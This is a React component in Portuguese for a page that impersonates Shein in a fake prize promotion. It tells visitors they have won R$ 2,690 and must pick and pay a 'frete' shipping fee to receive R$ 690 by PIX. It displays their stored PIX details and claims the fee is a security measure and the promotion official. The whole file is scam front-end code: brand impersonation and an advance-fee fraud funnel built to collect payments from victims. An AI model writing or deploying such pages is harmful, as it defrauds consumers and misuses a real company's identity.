import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import sheinLogo from "@/assets/shein-logo-custom.png";
import { useNavigate } from "react-router-dom";
import { CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface FreteOption {
  id: string;
  name: string;
  prazo: string;
  preco: number;
}

const freteOptions: FreteOption[] = [
  {
    id: "basico",
    name: "E-total - Básico",
    prazo: "(15 a 20 dias úteis)",
    preco: 19.98,
  },
  {
    id: "advanced",
    name: "E-total - Advanced",
    prazo: "(12 a 15 dias úteis)",
    preco: 27.27,
  },
  {
    id: "expresso",
    name: "E-total - Expresso",
    prazo: "(1 a 3 dias úteis)",
    preco: 32.40,
  },
];

const EscolhaFrete = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const premio = 2690;
  const [freteSelecionado, setFreteSelecionado] = useState<string>("");
  const [pixData, setPixData] = useState<{ titular: string; chavePixValue: string } | null>(null);

  useEffect(() => {
    // Recupera os dados do PIX do localStorage
    const dadosPix = localStorage.getItem("dadosPix");
    if (dadosPix) {
      setPixData(JSON.parse(dadosPix));
    }
  }, []);

  const handleSubmit = () => {
    if (!freteSelecionado) {
      toast({
        title: "Selecione uma opção",
        description: "Por favor, escolha uma modalidade de frete.",
        variant: "destructive",
      });
      return;
    }

    const freteEscolhido = freteOptions.find((f) => f.id === freteSelecionado);
    if (freteEscolhido) {
      localStorage.setItem("freteEscolhido", JSON.stringify(freteEscolhido));
      // Navigate to next step
      navigate("/verificacao-final");
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <div className="flex-1 p-4 pt-8">
        <div className="max-w-4xl mx-auto space-y-6">
          <div className="flex justify-between items-start">
            <img
              src={sheinLogo}
              alt="Shein Premiações"
              className="h-10 w-auto object-contain"
            />
            <div className="text-right">
              <p className="text-xs text-gray-600">Acumulado em prêmios:</p>
              <p className="text-xl font-bold">
                R${" "}
                {premio.toLocaleString("pt-BR", {
                  minimumFractionDigits: 2,
                  maximumFractionDigits: 2,
                })}
              </p>
            </div>
          </div>

          <div className="flex items-center justify-center min-h-[500px]">
            <Card className="w-full max-w-2xl p-8 shadow-lg border-2 border-gray-300 rounded-2xl bg-white">
              <div className="space-y-6">
                {/* Header com steps */}
                <div className="flex items-center justify-center gap-8 pb-6 border-b">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-[#00c853] flex items-center justify-center text-white font-bold">
                      <CheckCircle2 className="w-5 h-5" />
                    </div>
                    <span className="text-sm font-semibold">Entrega</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-[#00c853] flex items-center justify-center text-white font-bold">
                      <CheckCircle2 className="w-5 h-5" />
                    </div>
                    <span className="text-sm font-semibold">Frete</span>
                  </div>
                </div>

                {/* Escolha de frete */}
                <div className="space-y-4">
                  <h3 className="text-base font-semibold text-gray-800">
                    Escolha a melhor frete para você
                  </h3>

                  <RadioGroup
                    value={freteSelecionado}
                    onValueChange={setFreteSelecionado}
                    className="space-y-3"
                  >
                    {freteOptions.map((opcao) => (
                      <div
                        key={opcao.id}
                        className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                          freteSelecionado === opcao.id
                            ? "border-[#2563eb] bg-[#e6f0ff]"
                            : "border-gray-300 hover:border-gray-400"
                        }`}
                        onClick={() => setFreteSelecionado(opcao.id)}
                      >
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <RadioGroupItem value={opcao.id} id={opcao.id} />
                            <Label
                              htmlFor={opcao.id}
                              className="cursor-pointer flex flex-col"
                            >
                              <span className="font-semibold text-gray-800">
                                {opcao.name}
                              </span>
                              <span className="text-sm text-blue-600">
                                {opcao.prazo}
                              </span>
                            </Label>
                          </div>
                          <div className="font-bold text-gray-800">
                            R${" "}
                            {opcao.preco.toLocaleString("pt-BR", {
                              minimumFractionDigits: 2,
                              maximumFractionDigits: 2,
                            })}
                          </div>
                        </div>
                      </div>
                    ))}
                  </RadioGroup>

                  <Button
                    onClick={handleSubmit}
                    className="w-full bg-[#00c853] hover:bg-[#00a844] text-white py-3 text-sm font-bold rounded-md mt-6"
                  >
                    IR PARA O PAGAMENTO
                  </Button>
                </div>

                {/* Mensagem informativa com dados do PIX */}
                {pixData && (
                  <div className="bg-[#fff3cd] border-2 border-[#ffa500] rounded-lg p-4 space-y-2">
                    <div className="flex items-start gap-2">
                      <span className="text-xl">⚠️</span>
                      <div className="flex-1 space-y-2">
                        <p className="font-bold text-gray-800 text-sm">
                          INFORMAÇÃO IMPORTANTE SOBRE SEU PRÊMIO:
                        </p>
                        <p className="text-sm text-gray-800">
                          Em até <span className="font-bold text-[#dc2626]">30 MINUTOS</span> após você
                          finalizar o pagamento do frete, o valor de{" "}
                          <span className="font-bold text-[#dc2626]">R$ 690,00</span> será
                          enviado para a chave PIX cadastrada.
                        </p>
                        <p className="text-sm text-gray-800">
                          Enviaremos o valor de{" "}
                          <span className="font-bold text-[#dc2626]">R$ 690,00</span> para a
                          chave PIX cadastrada anteriormente.
                        </p>
                        <div className="bg-white border border-gray-300 rounded p-3 mt-2">
                          <p className="text-sm">
                            <span className="font-semibold text-gray-700">Titular:</span>{" "}
                            <span className="text-gray-800">{pixData.titular}</span>
                          </p>
                          <p className="text-sm">
                            <span className="font-semibold text-gray-700">Chave PIX:</span>{" "}
                            <span className="text-gray-800">{pixData.chavePixValue}</span>
                          </p>
                        </div>
                        <p className="text-sm text-gray-700 mt-2">
                          Você receberá uma notificação assim que o pagamento for processado!
                        </p>
                        <p className="text-sm text-gray-600 italic">
                          Esta é uma medida de segurança para fazer com que apenas pessoas reais participem.
                        </p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </Card>
          </div>
        </div>
      </div>

      <footer className="bg-[#374151] text-white py-4 mt-auto">
        <div className="max-w-4xl mx-auto px-4 text-center text-xs space-y-1">
          <p>© 2025 Shein. Todas as marcas foram usadas.</p>
          <p>Este é uma promoção oficial da Shein Brasil.</p>
        </div>
      </footer>
    </div>
  );
};

export default EscolhaFrete;
